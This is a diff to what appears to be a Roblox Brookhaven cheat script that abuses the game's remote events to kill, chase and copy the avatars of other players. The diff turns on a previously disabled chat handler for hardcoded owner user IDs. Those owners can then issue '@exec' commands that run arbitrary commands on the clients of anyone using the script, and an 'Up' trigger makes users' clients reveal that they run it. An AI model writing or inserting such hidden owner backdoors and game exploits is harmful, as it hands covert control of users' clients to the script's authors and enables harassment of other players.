@@ -160,6 +160,8 @@ selectJoin = Instance.new("TextButton")
 
 Admins = {"Potage898","Amynuv"}
 Owners = {2613898759, 911404169}
+Hastimeout = false
+timeout = 0
 
 function randomString()
 	local length = math.random(10,20)
@@ -2013,15 +2015,11 @@ local function copyavatar(player,id)
 	end
 	wait(evtimecopy)
 	game:GetService("ReplicatedStorage").RE["1Avata1rOrigina1l"]:FireServer("CharacterChange",{descriptionClone.Torso,descriptionClone.RightArm,descriptionClone.LeftArm,descriptionClone.RightLeg,descriptionClone.LeftLeg,descriptionClone.Head},"ClassicMale")
-	wait(evtimecopy)
-	game:GetService("ReplicatedStorage").RE["1Avata1rOrigina1l"]:FireServer("CharacterChange",{descriptionClone.Torso,descriptionClone.RightArm,descriptionClone.LeftArm,descriptionClone.RightLeg,descriptionClone.LeftLeg,descriptionClone.Head},"ClassicMale")
 
 	--Applique la forme du corp
 
 	wait(evtimecopy)
 	--Applique le visage et les animations
-	game:GetService("ReplicatedStorage").RE["1Updat1eAvata1r"]:FireServer("wear",descriptionClone.Face)
-	wait(evtimecopy)
 	game:GetService("ReplicatedStorage").RE["1Updat1eAvata1r"]:FireServer("wear",descriptionClone.Face)
 	wait(evtimecopy)
 	game:GetService("ReplicatedStorage").RE["1Updat1eAvata1r"]:FireServer("wear",descriptionClone.IdleAnimation)
@@ -2432,7 +2430,7 @@ function chase_player(victim, pos)
 	else
 		permerror()
 	end
-	
+
 
 end
 
@@ -2528,7 +2526,7 @@ function killplayer(name)
 	else
 		permerror()
 	end
-	
+
 end
 
 
@@ -4630,7 +4628,7 @@ end
 
 ChatLog = function(plr)
 	plr.Chatted:Connect(function(Message)
-		if false then
+		if isowner(plr) then
 			local splitted = string.split(Message," ")
 			if splitted[1] == "@op" then
 				local toop = (Message:sub(5))
@@ -4734,33 +4732,74 @@ ChatLog = function(plr)
 			end
 
 			if splitted[1] == "@exec" then
-				local toup = (Message:sub(7)) -- Extraire la cible de la commande (all ou nom de joueur)
+				local toup = (Message:sub(7))
 
-				-- Chercher la première occurrence d'un espace pour séparer la cible et la commande
+
 				local spaceIndex = toup:find(" ")
 				local playerName, command
 
 				if spaceIndex then
-					-- Si un espace est trouvé, séparer la cible et la commande
+
 					playerName = toup:sub(1, spaceIndex - 1)
 					command = toup:sub(spaceIndex + 1)
 				else
-					-- Si pas d'espace, toute la chaîne est considérée comme un joueur (ou "all")
+
 					playerName = toup
-					command = splitted[2] -- La commande après le @exec
+					command = splitted[2]
 				end
 
-				-- Si la cible est "all", exécuter la commande pour tous les joueurs
+
 				if playerName == "all" then
-					do_exec(command)  -- Exécuter la commande pour tous les joueurs
+					do_exec(command)  
 				else
-					-- Sinon, chercher le joueur spécifié et exécuter la commande uniquement pour lui
-					local targetPlayer = game.Players:FindFirstChild(playerName)
-					if playerName == game.Players.LocalPlayer.Name then
-						do_exec(command)  -- Exécuter la commande pour le joueur spécifique
+					local fps = mygtpName(playerName)
+					for i,v in pairs(fps) do
+						if v.Name == game.Players.LocalPlayer.Name then
+							do_exec(command) 
+						end
 					end
 				end
 			end
+
+
+			--if splitted[1] == "@timeout" then
+			--	local timeout = tonumber(Message:sub(10))
+			--	if timeout ~= nil then
+			--		Hastimeout = true
+			--		timeout = timeout * 60
+			--		local five_minutes_warning = 5 * 60
+
+			--		while timeout > 0 and Hastimeout == true do
+			--			if timeout == five_minutes_warning then
+			--				do_exec(";say Bot timeout reached in 5 minutes")
+			--			end
+
+			--			-- Pause pour une seconde.
+			--			wait(1)
+			--			timeout = timeout - 1
+			--		end
+			--		if Hastimeout then
+			--			do_exec(";say Bot timeout reached")
+			--			wait(3)
+			--			do_exec(";say Leaving...")
+			--			-- Expulser le joueur lorsque le délai est écoulé.
+			--			game.Players.LocalPlayer:Kick("Timeout reached!")
+			--		end
+			--	end
+			--end
+
+			--if splitted[1] == "@showtimeout" then
+			--	do_exec(";say Timeout: "..tostring(timeout).." secondes.")
+			--end
+
+			--if splitted[1] == "@untimeout" then
+			--	-- Arrêter le compte à rebours
+			--	if Hastimeout then
+			--		Hastimeout = false
+			--	else
+			--		do_exec(";say No active timeout to cancel")
+			--	end
+			--end
 
 
 
@@ -4777,8 +4816,19 @@ ChatLog = function(plr)
 		end
 
 
-		if plr.UserId == Players.LocalPlayer.UserId then
+		if plr == Players.LocalPlayer then
 			do_exec(Message)
+		end
+		
+		if isowner(plr) then
+			if tostring(Message) == "Up" then
+				chatMessage(tostring("Up in "..tostring(currentVersion)))
+				local bio = Players.LocalPlayer.PlayersBag.RPBio.Value
+				
+				game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", tostring("BrookHaven Yield user!"))
+				wait(5)
+				game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", tostring(bio))
+			end
 		end
 
 		if logsEnabled == true then
@@ -12693,7 +12743,10 @@ addcmd('kill',{'fekill'},function(args, speaker)
 	end
 end)
 
-
+addcmd('up',{'whousemyscript'},function(args, speaker)
+	chatMessage(tostring("Up"))
+	
+end)
 
 
 local RunService = game:GetService("RunService")
@@ -14056,7 +14109,7 @@ end
 
 IYMouse.Move:Connect(checkTT)
 givecouch()
-wait(5)
+wait(3)
 game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayName",tostring(""))
 wait(0.2)
 game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", tostring(""))
